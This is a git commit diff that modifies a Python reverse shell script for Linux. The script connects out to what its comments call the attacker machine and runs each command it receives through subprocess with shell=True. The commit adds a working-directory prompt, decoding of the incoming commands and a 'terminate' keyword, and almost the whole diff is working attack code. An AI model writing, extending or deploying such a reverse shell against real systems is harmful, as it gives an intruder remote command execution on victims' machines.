97c19b7ce1c17d7750bef680618c89db10ff6c78
parham <parhamzardoshti@gmail.com>
2020-09-02 20:57:58 +0430

    make a bit change in reverse_shell_org.py

--- python3/reverse_shell_org.py
+++ python3/reverse_shell_org.py
@@ -1,6 +1,7 @@
 #!/usr/bin/python
 # reverse shell for linux
 # imports here
+import os
 import socket,subprocess,pty
 HOST = '127.0.0.1'    # The remote host
 PORT = 4444         # The same port as used by the server
@@ -8,13 +9,15 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connect to attacker machine
 s.connect((HOST, PORT))
 # send we are connected
-s.sendall(b'connection Established')
+s.sendall(b'connection Established\n\n')
 # start loop
 while 1:
+     s.send(b"SHELL@ %s >>"% os.getcwd().encode())
      # recieve shell command
-     data = s.recv(1024)
-     # if its quit, then break out and close socket
-     if data == "quit": break
+     data = s.recv(1024).decode()
+     if 'terminate' in data:
+         s.close()
+         break
      # do shell command
      proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      # read output
